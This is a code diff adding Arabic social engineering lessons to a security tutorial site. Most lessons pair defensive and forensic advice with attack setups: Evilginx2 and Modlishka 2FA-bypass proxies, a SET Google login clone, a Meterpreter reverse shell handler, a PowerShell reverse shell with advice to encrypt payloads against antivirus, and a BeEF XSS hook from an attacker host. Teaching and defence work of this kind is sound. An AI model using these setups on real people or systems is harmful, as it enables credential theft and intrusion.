@@ -1655,7 +1655,119 @@ const TUTORIALS = [
     { title:'اختيار طريقة التوصيل', text:'بعد اختيار الموقع، اختر Localhost للتجربة المحلية أو Cloudflared لرابط خارجي مؤقت.', cmd:'# [1] Localhost (للاختبار المحلي)\n# [2] Cloudflared (رابط خارجي مؤقت)\n# [3] Ngrok (يتطلب حساب)\n# للتجربة المحلية اختر 1\n# الرابط: http://127.0.0.1:8080', cmdDesc:'اختيار طريقة الوصول' },
     { title:'كيف تحمي نفسك من Phishing', text:'الآن بعد فهمك لآلية الـ Phishing: تحقق دائماً من الـ URL، لا تنقر على روابط مشبوهة، فعّل 2FA، استخدم مدير كلمات مرور.', cmd:'# كشف صفحات Phishing:\n# 1. تحقق من URL:\n#    ❌ faceb00k.com\n#    ✅ facebook.com\n# 2. فحص SSL Certificate:\nopenssl s_client -connect suspicious-site.com:443 | grep subject\n# 3. فحص باستخدام VirusTotal', cmdDesc:'طرق الحماية من التصيد', note:'91% من الهجمات تبدأ بـ Phishing!' }
   ]
+},
+
+// ============================================================
+// SOCIAL ENGINEERING LESSONS (102-111)
+// ============================================================
+{
+  id:102, title:'أساسيات الهندسة الاجتماعية (Social Engineering)', icon:'🎭', level:'beginner', cat:'social',
+  tags:['هندسة اجتماعية','social engineering','تصيد','phishing'],
+  desc:'تعلّم المبادئ الأساسية للهندسة الاجتماعية وأنواع الهجمات وكيف يستغل المهاجمون علم النفس البشري.',
+  steps:[
+    { title:'ما هي الهندسة الاجتماعية؟', text:'الهندسة الاجتماعية هي فن التلاعب بالبشر للحصول على معلومات سرية أو تنفيذ إجراءات ضارة. تعتمد على استغلال الثقة والخوف والفضول.', cmd:'# أنواع الهندسة الاجتماعية:\n# 1. Phishing - التصيد الإلكتروني\n# 2. Vishing - التصيد الصوتي\n# 3. Smishing - التصيد عبر SMS\n# 4. Pretexting - انتحال الشخصية\n# 5. Baiting - الإغراء (USB مفخخ)\n# 6. Tailgating - التسلل الفيزيائي', cmdDesc:'أنواع الهندسة الاجتماعية' },
+    { title:'إعداد بيئة اختبار', text:'قبل البدء، نحتاج بيئة آمنة للتدريب. سنستخدم آلات افتراضية معزولة.', cmd:'# إعداد بيئة التدريب:\nsudo apt update\nsudo apt install -y virtualbox vagrant\n# إنشاء شبكة معزولة:\nvboxmanage natnetwork add --netname SELab --network "10.0.100.0/24" --enable', cmdDesc:'إعداد بيئة اختبار معزولة' },
+    { title:'أدوات الهندسة الاجتماعية في Kali', text:'Kali Linux تحتوي على مجموعة أدوات مخصصة للهندسة الاجتماعية.', cmd:'# الأدوات المتاحة:\nsudo apt install -y set beef-xss maltego\n# عرض أدوات SE:\nls /usr/share/set/\n# Social-Engineer Toolkit:\nsudo setoolkit', cmdDesc:'تثبيت أدوات الهندسة الاجتماعية' },
+    { title:'الحماية من الهندسة الاجتماعية', text:'أهم وسائل الحماية: التوعية المستمرة، التحقق من الهوية، عدم مشاركة المعلومات الحساسة، وتفعيل 2FA.', cmd:'# قواعد الحماية الأساسية:\n# ✅ تفعيل المصادقة الثنائية (2FA)\n# ✅ التحقق من هوية المتصل دائماً\n# ✅ عدم النقر على روابط مشبوهة\n# ✅ استخدام مدير كلمات مرور\n# ✅ تدريب الموظفين بشكل دوري\n# ✅ الإبلاغ عن أي محاولة مشبوهة', cmdDesc:'قواعد الحماية الأساسية', note:'91% من الهجمات السيبرانية تبدأ بهندسة اجتماعية!' }
+  ]
+},
+{
+  id:103, title:'هجمات التصيد المتقدمة (Advanced Phishing)', icon:'🎣', level:'advanced', cat:'exploitation',
+  tags:['phishing','تصيد متقدم','2fa bypass','spear phishing'],
+  desc:'تقنيات التصيد المتقدمة بما في ذلك Spear Phishing واستخدام أدوات Reverse Proxy لتجاوز 2FA.',
+  steps:[
+    { title:'Spear Phishing vs Mass Phishing', text:'التصيد الموجّه يستهدف أشخاصاً محددين برسائل مخصصة، بينما التصيد الجماعي يرسل نفس الرسالة للجميع.', cmd:'# جمع معلومات عن الهدف:\ntheHarvester -d target-corp.com -b all -l 200\n# البحث عن موظفين:\npython3 sherlock targetuser\n# فحص LinkedIn:\n# تحليل المنشورات والاهتمامات', cmdDesc:'استطلاع قبل التصيد الموجّه' },
+    { title:'إنشاء حملة تصيد بـ Gophish', text:'Gophish منصة احترافية لإدارة حملات التصيد التعليمية مع تتبع وتقارير مفصلة.', cmd:'# تشغيل Gophish:\ncd gophish && sudo ./gophish\n# الوصول: https://localhost:3333\n# إنشاء حملة:\n# 1. Sending Profiles → SMTP server\n# 2. Landing Pages → استنساخ صفحة\n# 3. Email Templates → قالب البريد\n# 4. Users & Groups → قائمة الأهداف\n# 5. Campaigns → إطلاق الحملة', cmdDesc:'إعداد حملة تصيد في Gophish' },
+    { title:'تجاوز 2FA بـ Evilginx2', text:'Evilginx2 يعمل كـ Reverse Proxy يعترض جلسات المصادقة كاملة بما فيها رموز 2FA.', cmd:'# تثبيت Evilginx2:\ngit clone https://github.com/kgretzky/evilginx2.git\ncd evilginx2 && make\n# التشغيل:\nsudo ./evilginx2\n# إعداد النطاق:\nconfig domain evil.example.com\nconfig ip YOUR_IP\nphishlets hostname o365 login.evil.example.com\nphishlets enable o365\nlures create o365', cmdDesc:'إعداد Evilginx2 لتجاوز 2FA', note:'⚠️ خطير جداً - للاختبار المصرح فقط!' },
+    { title:'كشف هجمات التصيد المتقدمة', text:'تقنيات كشف التصيد المتقدم تشمل فحص Headers، تحليل URLs، واستخدام أدوات تحليل البريد.', cmd:'# فحص Email Headers:\n# Received: from suspicious-server.com\n# Reply-To: attacker@evil.com\n# تحليل URL مشبوه:\ncurl -sI https://suspicious-link.com | head -20\nwhois suspicious-domain.com\n# فحص بـ VirusTotal:\n# https://www.virustotal.com/gui/url/', cmdDesc:'تقنيات كشف التصيد المتقدم' }
+  ]
+},
+{
+  id:104, title:'استطلاع OSINT المتقدم', icon:'🔍', level:'intermediate', cat:'recon',
+  tags:['osint','استطلاع','reconnaissance','معلومات مفتوحة'],
+  desc:'تقنيات جمع المعلومات من المصادر المفتوحة لبناء ملف شامل عن الهدف باستخدام أدوات OSINT المتقدمة.',
+  steps:[
+    { title:'منهجية OSINT', text:'OSINT يتبع منهجية منظمة: تحديد الهدف → جمع البيانات → تحليل → ربط المعلومات → تقرير.', cmd:'# مصادر OSINT الرئيسية:\n# 🌐 محركات البحث (Google Dorks)\n# 📧 قواعد البريد المسرب\n# 🐦 منصات التواصل\n# 📋 السجلات العامة (WHOIS)\n# 🗺️ خرائط وصور الأقمار\n# 💼 مواقع التوظيف\n\n# Google Dorks:\nsite:target.com filetype:pdf\n"target company" "password" OR "credentials"', cmdDesc:'مصادر ومنهجية OSINT' },
+    { title:'جمع المعلومات بـ theHarvester', text:'theHarvester أداة أساسية لجمع الإيميلات والنطاقات الفرعية من محركات البحث.', cmd:'# جمع شامل:\ntheHarvester -d target.com -b all -l 500 -f target_report\n# مصادر محددة:\ntheHarvester -d target.com -b google,linkedin,dnsdumpster\n# البحث عن نطاقات فرعية:\ntheHarvester -d target.com -b crtsh,dnsdumpster', cmdDesc:'جمع المعلومات بأداة theHarvester' },
+    { title:'تحليل العلاقات بـ Maltego', text:'Maltego يحول البيانات الخام إلى رسوم بيانية تكشف العلاقات المخفية.', cmd:'# تشغيل Maltego:\nmaltego\n# خطوات التحليل:\n# 1. New Graph\n# 2. إضافة Entity: Domain = target.com\n# 3. Run Transforms:\n#    → To DNS Names\n#    → To Email Addresses\n#    → To Person\n#    → To Social Media Profile\n# 4. تحليل الرسم البياني', cmdDesc:'تحليل مرئي بـ Maltego' },
+    { title:'البحث عن البصمة الرقمية', text:'Sherlock يبحث عن اسم مستخدم عبر مئات المنصات لتحديد البصمة الرقمية الكاملة.', cmd:'# البحث عن مستخدم:\npython3 sherlock targetuser --print-found\n# بحث متعدد:\npython3 sherlock user1 user2 --output results/\n# عبر Tor:\npython3 sherlock targetuser --tor\n# تصدير النتائج:\npython3 sherlock targetuser --csv --output target.csv', cmdDesc:'تتبع البصمة الرقمية بـ Sherlock' }
+  ]
+},
+{
+  id:105, title:'التصيد الصوتي والرسائل (Vishing & Smishing)', icon:'📞', level:'intermediate', cat:'social',
+  tags:['vishing','smishing','تصيد صوتي','هاتف'],
+  desc:'تعلّم تقنيات التصيد عبر الهاتف والرسائل النصية وكيفية اكتشافها والحماية منها.',
+  steps:[
+    { title:'ما هو Vishing؟', text:'Vishing (Voice Phishing) هو التصيد عبر المكالمات الهاتفية. المهاجم ينتحل شخصية موظف بنك أو دعم فني للحصول على معلومات حساسة.', cmd:'# سيناريوهات Vishing الشائعة:\n# 🏦 انتحال موظف بنك\n# 🖥️ دعم تقني مزيف (Microsoft)\n# 👮 انتحال جهة حكومية\n# 🏥 مكالمة طبية وهمية\n\n# أدوات الـ Vishing:\n# - VoIP software (Asterisk)\n# - Caller ID Spoofing\n# - Voice changers', cmdDesc:'أنواع التصيد الصوتي' },
+    { title:'Smishing - التصيد عبر SMS', text:'Smishing يستخدم رسائل SMS تحتوي روابط خبيثة أو تطلب معلومات حساسة.', cmd:'# أمثلة Smishing:\n# ❌ "حسابك البنكي معلّق، انقر هنا: bit.ly/xxx"\n# ❌ "ربحت جائزة! أدخل بياناتك: evil.com"\n# ❌ "طرد DHL بانتظارك: track.evil.com"\n\n# فحص رابط مشبوه:\ncurl -sI "https://suspicious-link.com" | grep -i location\nwhois $(echo "https://evil.com" | awk -F/ \x27{print $3}\x27)', cmdDesc:'أمثلة التصيد عبر الرسائل' },
+    { title:'الحماية والكشف', text:'تقنيات كشف Vishing و Smishing تشمل التحقق من هوية المتصل، عدم مشاركة معلومات عبر الهاتف، والإبلاغ عن المحاولات.', cmd:'# خطوات الحماية:\n# 1. لا تشارك كلمات مرور عبر الهاتف أبداً\n# 2. تحقق من الرقم عبر الموقع الرسمي\n# 3. لا تنقر على روابط SMS مشبوهة\n# 4. فعّل تصفية الرسائل\n# 5. استخدم تطبيق كشف الاحتيال\n\n# فحص رقم مشبوه:\n# https://www.truecaller.com/\n# الإبلاغ عن تصيد:\n# reportphishing@apwg.org', cmdDesc:'الحماية من التصيد الصوتي والرسائل', note:'60% من هجمات Smishing تنجح لأن الناس يثقون بالرسائل أكثر من البريد!' }
+  ]
+},
+{
+  id:106, title:'دليل SET الشامل (Social-Engineer Toolkit)', icon:'🛠️', level:'intermediate', cat:'exploitation',
+  tags:['set','social engineer toolkit','payload','phishing'],
+  desc:'دليل تفصيلي لاستخدام Social-Engineer Toolkit - أقوى أداة هندسة اجتماعية في Kali Linux.',
+  steps:[
+    { title:'تثبيت وتشغيل SET', text:'SET مُثبت مسبقاً في Kali Linux ويوفر قائمة تفاعلية شاملة.', cmd:'# تشغيل SET:\nsudo setoolkit\n# القائمة الرئيسية:\n# 1) Social-Engineering Attacks\n# 2) Penetration Testing (Fast-Track)\n# 3) Third Party Modules\n# 4) Update the SET\n# 5) Update SET configuration\n# اختر 1 للهجمات الاجتماعية', cmdDesc:'تشغيل SET والقائمة الرئيسية' },
+    { title:'استنساخ المواقع (Credential Harvester)', text:'أقوى تقنيات SET هي استنساخ المواقع لجمع بيانات الدخول.', cmd:'# المسار:\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Attack Method\n# 2) Site Cloner\n# أدخل IP الخادم: 192.168.1.100\n# أدخل URL الموقع: https://accounts.google.com\n# الآن أي شخص يفتح IP الخادم سيرى نسخة من Google', cmdDesc:'استنساخ صفحة تسجيل الدخول' },
+    { title:'إنشاء Payload مخفي', text:'SET يمكنه إنشاء ملفات خبيثة مخفية داخل مستندات عادية.', cmd:'# المسار:\n# 1) Social-Engineering Attacks\n# 4) Create a Payload and Listener\n# اختر نوع الـ Payload:\n# 2) Windows Reverse_TCP Meterpreter\n# LHOST: 192.168.1.100\n# LPORT: 4444\n# سيُنشئ ملف .exe\n\n# للاستماع:\nmsfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"', cmdDesc:'إنشاء Payload واستماع' },
+    { title:'هجمات PowerShell', text:'هجمات PowerShell من SET فعّالة جداً ضد أنظمة Windows.', cmd:'# المسار:\n# 1) Social-Engineering Attacks\n# 9) Powershell Attack Vectors\n# 1) Powershell Alphanumeric Shellcode Injector\n# أدخل IP: 192.168.1.100\n# PORT: 443\n# سيُنشئ أمر PowerShell:\n# powershell -W 1 -C "sv o (New-Object...)"\n\n# الأمر يبدو بريئاً لكنه يفتح reverse shell', cmdDesc:'هجمة PowerShell عبر SET', note:'⚠️ كثير من مضادات الفيروسات تكشف Payloads الافتراضية - استخدم التشفير' }
+  ]
+},
+{
+  id:107, title:'تقنيات تجاوز المصادقة الثنائية (2FA Bypass)', icon:'🔓', level:'advanced', cat:'exploitation',
+  tags:['2fa','bypass','evilginx','reverse proxy'],
+  desc:'فهم تقنيات تجاوز 2FA باستخدام Reverse Proxy والاعتراض في الوقت الحقيقي - لتقوية دفاعاتك.',
+  steps:[
+    { title:'كيف يعمل 2FA وأين نقاط الضعف؟', text:'المصادقة الثنائية تضيف طبقة أمان، لكن بعض التنفيذات قابلة للتجاوز عبر تقنيات MITM.', cmd:'# أنواع 2FA:\n# 📱 SMS OTP (الأضعف)\n# 📧 Email OTP\n# 🔐 TOTP (Google Authenticator)\n# 🔑 Hardware Keys (FIDO2 - الأقوى)\n\n# نقاط الضعف:\n# ❌ SMS: عرضة لـ SIM Swapping\n# ❌ TOTP: عرضة لـ Real-time Phishing\n# ✅ FIDO2: مقاوم للتصيد', cmdDesc:'تحليل أنواع المصادقة الثنائية' },
+    { title:'Evilginx2 - تجاوز 2FA عملياً', text:'Evilginx2 يعمل كـ Transparent Reverse Proxy يعترض كل حركة المرور بين الضحية والموقع الحقيقي.', cmd:'# تثبيت:\ngit clone https://github.com/kgretzky/evilginx2.git\ncd evilginx2 && make\nsudo ./evilginx2\n\n# الإعداد:\nconfig domain evil.test.com\nconfig ip 10.0.0.1\nphishlets hostname microsoft365 login.evil.test.com\nphishlets enable microsoft365\nlures create microsoft365\nlures get-url 0', cmdDesc:'إعداد Evilginx2 لاختبار 2FA' },
+    { title:'Modlishka كبديل', text:'Modlishka أداة Reverse Proxy أخرى أبسط في الإعداد من Evilginx2.', cmd:'# تثبيت Modlishka:\ngit clone https://github.com/drk1wi/Modlishka.git\ncd Modlishka && make\n\n# إعداد ملف التكوين:\ncat > config.json << EOF\n{\n  "phishingDomain": "evil.test.com",\n  "target": "accounts.google.com",\n  "listeningPort": 443,\n  "log": "creds.log"\n}\nEOF\nsudo ./Modlishka -config config.json', cmdDesc:'إعداد Modlishka' },
+    { title:'الحماية من تجاوز 2FA', text:'FIDO2/WebAuthn هو المعيار الوحيد المقاوم للتصيد حالياً.', cmd:'# أفضل الممارسات:\n# 1. استخدم FIDO2/WebAuthn (YubiKey, Titan Key)\n# 2. فعّل Conditional Access\n# 3. راقب تسجيلات الدخول المشبوهة\n# 4. استخدم Passkeys بدلاً من كلمات المرور\n\n# اختبار دعم FIDO2:\n# https://webauthn.io/\n# إنشاء Passkey:\n# Settings > Security > Passkeys', cmdDesc:'الحماية من تجاوز 2FA', note:'FIDO2 هو الحل الوحيد المقاوم للتصيد لأنه يتحقق من النطاق' }
+  ]
+},
+{
+  id:108, title:'فن انتحال الشخصية (Pretexting & Impersonation)', icon:'🎪', level:'intermediate', cat:'social',
+  tags:['pretexting','انتحال','social engineering','manipulation'],
+  desc:'تقنيات بناء السيناريوهات والقصص الوهمية المقنعة - لفهم كيف يعمل المهاجمون وكيف نكشفهم.',
+  steps:[
+    { title:'ما هو Pretexting؟', text:'Pretexting هو بناء قصة أو سيناريو مقنع لخداع الهدف وجعله يكشف معلومات أو ينفذ إجراءات.', cmd:'# عناصر Pretext الناجح:\n# 1. 🎭 شخصية مقنعة (موظف IT, مدير, موصّل)\n# 2. 📋 معلومات حقيقية عن المؤسسة\n# 3. ⏰ إلحاح زمني (مشكلة عاجلة)\n# 4. 🏢 معرفة بالهيكل التنظيمي\n# 5. 🗣️ لغة مناسبة للدور\n\n# جمع المعلومات:\ntheHarvester -d target.com -b linkedin\n# فهم الهيكل التنظيمي', cmdDesc:'عناصر انتحال الشخصية الناجح' },
+    { title:'سيناريوهات شائعة', text:'أكثر سيناريوهات Pretexting شيوعاً واستخداماً في الاختبارات الأمنية.', cmd:'# سيناريو 1: دعم IT\n# "مرحباً، أنا من قسم IT. نحتاج تحديث حسابك بسبب ثغرة أمنية"\n\n# سيناريو 2: مدير جديد\n# "أنا المدير الجديد لقسم X. أحتاج وصولاً مؤقتاً للنظام"\n\n# سيناريو 3: مورّد خارجي\n# "أنا من شركة Y المتعاقدة. أحتاج التحقق من إعدادات الخادم"\n\n# سيناريو 4: مراجع أمني\n# "نحن نجري تدقيقاً أمنياً. يرجى تزويدنا بقائمة المستخدمين"', cmdDesc:'سيناريوهات Pretexting الشائعة' },
+    { title:'كشف محاولات Pretexting', text:'كيف تكتشف أن شخصاً يحاول خداعك باستخدام Pretexting.', cmd:'# علامات التحذير:\n# 🚩 إلحاح غير مبرر\n# 🚩 طلب معلومات حساسة عبر الهاتف\n# 🚩 عدم القدرة على التحقق من الهوية\n# 🚩 معلومات غير دقيقة عن المؤسسة\n# 🚩 رفض التواصل عبر القنوات الرسمية\n\n# إجراءات التحقق:\n# ✅ اطلب رقم التحويلة الداخلية\n# ✅ تحقق من الهوية عبر قنوات أخرى\n# ✅ ارجع للمتصل عبر الرقم الرسمي\n# ✅ أبلغ فريق الأمن فوراً', cmdDesc:'كشف محاولات انتحال الشخصية', note:'أغلب الاختراقات الكبرى بدأت بمكالمة هاتفية بسيطة!' }
+  ]
+},
+{
+  id:109, title:'إطار BeEF لاختبار المتصفحات', icon:'🥩', level:'advanced', cat:'exploitation',
+  tags:['beef','browser exploitation','xss','hook'],
+  desc:'استخدام Browser Exploitation Framework لاختبار أمان المتصفحات واستغلال ثغرات XSS.',
+  steps:[
+    { title:'تثبيت وتشغيل BeEF', text:'BeEF يخطف المتصفح عبر حقن JavaScript Hook ويتحكم به عن بعد.', cmd:'# التثبيت:\nsudo apt update && sudo apt install -y beef-xss\n# التشغيل:\nsudo beef-xss\n# لوحة التحكم:\n# http://127.0.0.1:3000/ui/panel\n# المستخدم: beef\n# كلمة المرور: تُعرض في الطرفية\n\n# Hook URL:\n# <script src="http://ATTACKER:3000/hook.js"></script>', cmdDesc:'تثبيت وتشغيل BeEF' },
+    { title:'استغلال ثغرة XSS مع BeEF', text:'عند وجود ثغرة XSS في موقع، يمكن حقن BeEF Hook للتحكم بمتصفح الزائر.', cmd:'# حقن Hook عبر XSS:\n# الثغرة: http://target.com/search?q=<script>...</script>\n# الحقن:\n# http://target.com/search?q=<script src="http://attacker:3000/hook.js"></script>\n\n# بعد الحقن، سيظهر المتصفح في لوحة BeEF\n# يمكنك الآن تنفيذ الأوامر عن بعد', cmdDesc:'استغلال XSS مع BeEF' },
+    { title:'وحدات الهجوم', text:'BeEF يحتوي أكثر من 300 وحدة هجوم مصنفة حسب النوع.', cmd:'# الوحدات المهمة:\n# Browser > Hooked Domain > Get Cookie\n# → جمع Cookies الجلسة\n\n# Social Engineering > Pretty Theft\n# → نافذة تسجيل دخول مزيفة\n\n# Social Engineering > Fake Notification Bar\n# → شريط إشعار مزيف لتحميل ملف\n\n# Network > Get Internal IP\n# → كشف IP الداخلي للضحية\n\n# Persistence > Man-In-The-Browser\n# → اعتراض كل نشاط المتصفح', cmdDesc:'وحدات هجوم BeEF الرئيسية' },
+    { title:'الحماية من هجمات BeEF', text:'كيف تحمي تطبيقات الويب من هجمات Browser Exploitation.', cmd:'# الحماية:\n# 1. منع XSS:\n#    Content-Security-Policy: script-src self\n#    X-XSS-Protection: 1; mode=block\n\n# 2. أمان Cookies:\n#    Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict\n\n# 3. فحص التطبيق:\nnpm install -g retire\nretire --path /var/www/html/\n\n# 4. WAF Rules:\n# Block external script sources\n# Block known BeEF hook patterns', cmdDesc:'الحماية من هجمات المتصفح', note:'Content-Security-Policy هو أقوى دفاع ضد BeEF!' }
+  ]
+},
+{
+  id:110, title:'بناء برنامج Security Awareness', icon:'🏫', level:'beginner', cat:'social',
+  tags:['awareness','توعية','تدريب','security culture'],
+  desc:'كيف تبني برنامج توعية أمنية فعّال للمؤسسة يقلل مخاطر الهندسة الاجتماعية.',
+  steps:[
+    { title:'تخطيط برنامج التوعية', text:'برنامج التوعية الفعّال يبدأ بتقييم الوضع الحالي وتحديد المخاطر الأعلى.', cmd:'# خطوات بناء البرنامج:\n# 1. تقييم المخاطر الحالية\n# 2. تحديد الجمهور المستهدف\n# 3. اختيار أساليب التدريب\n# 4. إنشاء محتوى تعليمي\n# 5. تنفيذ حملات محاكاة\n# 6. قياس النتائج\n# 7. تحسين مستمر\n\n# أدوات القياس:\n# - Gophish (حملات تصيد)\n# - KnowBe4 (تدريب)\n# - Proofpoint (محاكاة)', cmdDesc:'خطة بناء برنامج توعية' },
+    { title:'تنفيذ حملة تصيد تدريبية', text:'حملات التصيد التدريبية تكشف نقاط الضعف وتقيس مستوى الوعي الحقيقي.', cmd:'# إعداد Gophish:\ncd gophish && sudo ./gophish\n# 1. أنشئ Sending Profile (SMTP)\n# 2. أنشئ Email Template:\n#    عنوان: "تحديث أمني مطلوب"\n#    المحتوى: رابط لصفحة وهمية\n# 3. أنشئ Landing Page:\n#    صفحة توعية بعد النقر\n# 4. أضف المستخدمين\n# 5. أطلق الحملة وتتبع النتائج', cmdDesc:'تنفيذ حملة تصيد تدريبية بـ Gophish' },
+    { title:'تقييم النتائج والتحسين', text:'تحليل نتائج الحملات لتحسين البرنامج وتحديد المجالات الأضعف.', cmd:'# مؤشرات القياس (KPIs):\n# 📊 نسبة النقر على الروابط\n# 📊 نسبة إدخال بيانات الدخول\n# 📊 نسبة الإبلاغ عن التصيد\n# 📊 زمن الإبلاغ\n\n# تحليل النتائج:\n# - قارن النتائج بالحملات السابقة\n# - حدد الأقسام الأضعف\n# - خصص تدريب إضافي\n# - كرر كل ربع سنوي\n\n# الهدف: نقل نسبة النقر من 30% إلى أقل من 5%', cmdDesc:'قياس وتحسين الوعي الأمني', note:'المؤسسات التي تدرّب موظفيها تقلل الهجمات بنسبة 70%!' }
+  ]
+},
+{
+  id:111, title:'التحقيق في هجمات الهندسة الاجتماعية (SE Forensics)', icon:'🔬', level:'advanced', cat:'forensics',
+  tags:['forensics','تحقيق','incident response','social engineering'],
+  desc:'تقنيات التحقيق الجنائي الرقمي في حوادث الهندسة الاجتماعية وتتبع المهاجمين.',
+  steps:[
+    { title:'تحليل البريد الإلكتروني المشبوه', text:'فحص Headers البريد الإلكتروني لتتبع مصدر رسالة التصيد.', cmd:'# استخراج Headers:\ncat suspicious_email.eml | grep -E "^(From|To|Subject|Received|Reply-To|X-Originating|Return-Path):"\n\n# تحليل IP المرسل:\nwhois 1.2.3.4\nnslookup 1.2.3.4\n\n# فحص SPF/DKIM/DMARC:\ndig TXT sender-domain.com | grep spf\ndig TXT _dmarc.sender-domain.com\n\n# تحليل الروابط في البريد:\ncurl -sI "https://suspicious-link.com" | head -20', cmdDesc:'تحليل بريد التصيد الاحتيالي' },
+    { title:'تحليل صفحة التصيد', text:'فحص صفحة الـ Phishing Landing لجمع أدلة عن المهاجم.', cmd:'# تحميل الصفحة:\nwget --mirror https://phishing-page.com/\n\n# فحص الكود المصدري:\ngrep -r "action=" downloaded_site/\ngrep -r "fetch\\|ajax\\|XMLHttpRequest" downloaded_site/\n\n# تحليل JavaScript:\ncat downloaded_site/*.js | js-beautify\n\n# فحص الخادم:\nnmap -sV phishing-page.com\ncurl -s https://phishing-page.com/robots.txt', cmdDesc:'تحليل جنائي لصفحة التصيد' },
+    { title:'تتبع المهاجم', text:'استخدام الأدلة الرقمية لتتبع هوية المهاجم.', cmd:'# تحليل النطاق:\nwhois phishing-domain.com\n# تاريخ النطاق:\ncurl -s "https://web.archive.org/cdx/search/cdx?url=phishing-domain.com&output=json" | head\n\n# فحص الشهادة:\nopenssl s_client -connect phishing-domain.com:443 2>/dev/null | openssl x509 -noout -text | grep -E "Subject:|Issuer:"\n\n# البحث عن نطاقات مرتبطة:\n# https://securitytrails.com/\n# https://crt.sh/?q=phishing-domain.com', cmdDesc:'تتبع المهاجم عبر الأدلة الرقمية' },
+    { title:'كتابة تقرير الحادثة', text:'توثيق الحادثة بشكل منهجي لاتخاذ إجراءات مستقبلية.', cmd:'# هيكل التقرير:\ncat > incident_report.md << EOF\n# تقرير حادثة هندسة اجتماعية\n## ملخص الحادثة\n- التاريخ: $(date +%Y-%m-%d)\n- النوع: Spear Phishing\n- الأهداف المتأثرة: [عدد]\n\n## الجدول الزمني\n- [وقت] اكتشاف الحادثة\n- [وقت] بدء التحقيق\n- [وقت] احتواء الحادثة\n\n## الأدلة\n- Email Headers\n- Phishing URL Analysis\n- Affected Credentials\n\n## التوصيات\n- إعادة تعيين كلمات المرور\n- تفعيل 2FA\n- تدريب إضافي\nEOF', cmdDesc:'كتابة تقرير حادثة', note:'التوثيق الجيد يمنع تكرار الحادثة ويحسّن الاستجابة المستقبلية' }
+  ]
 }
+
 ];
 
 let activeFilter = 'all';
@@ -1667,7 +1779,6 @@ function renderLessons() {
   const noRes = document.getElementById('noResults');
   const q = searchQ.toLowerCase();
   const baseLessons = TUTORIALS
-    .filter(t => Number(t.id) <= 100)
     .sort((a, b) => a.id - b.id);
 
   let filtered = baseLessons.filter(t => {
